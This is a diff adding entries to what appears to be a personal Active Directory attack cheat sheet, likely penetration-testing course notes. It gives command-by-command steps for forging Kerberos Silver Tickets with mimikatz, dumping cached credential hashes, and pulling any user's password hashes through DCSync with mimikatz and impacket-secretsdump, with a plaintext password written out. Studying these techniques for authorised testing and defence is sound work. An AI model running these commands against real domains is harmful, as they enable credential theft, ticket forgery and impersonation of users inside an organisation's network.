@@ -50,3 +50,36 @@
 - Windows (victim way)
 1. ``` .\Rubeus.exe kerberoast /outfile:hashes.kerberoast ```
 2. hashcat crack
+
+## Silver Tickets
+- Forge service tickets step
+- Requires: 
+    1. SPN password hash
+    2. Domain SID
+    3. Target SPN
+- Use ticket accesss HTTP SPN resource
+- Windows (victim way)
+1. Find that service admin hash in cached data w/ ```mimikatz> sekurlsa::logonpasswords ``` 
+2. Domain sid ```pwsh> whoami /user ``` ``` S-1-5-21-1987370270-658905905-1781884369-1105 ``` BUT ignore last segment ``` -1105```
+3. Target SPN e.g. web6969.corp.com
+4. Run ```mimikatz> kerberos::golden /sid:{sid} /domain:corp.com /ptt /target:{target spn} /service:http /rc4:{hashes} /user:{user you want to impersonate} ```
+5. check tickets ```pwsh> klist ```
+6. try access kerberos services: ``` iwr -UseDefaultCredentials http://web04 ```
+
+## Domain Controller Sync
+- Only works in sync turned on DC (Production real world will have)
+- Requires DC admin ( Replicating Directory Changes Permissions )
+- NLTM module 1000
+- Windows (Victim way)
+  1. Login to DC admin
+  2. Obtain any user credentials(hashed) ``` lsadump::dcsync /user:corp\dave ```
+- Linux (Kali way)
+1. ``` impacket-secretsdump -just-dc-user {target user to get} corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@{dc_ip} ```
+
+
+
+## Useful things
+1. Run As Admin
+    https://github.com/antonioCoco/RunasCs 
+
+2.
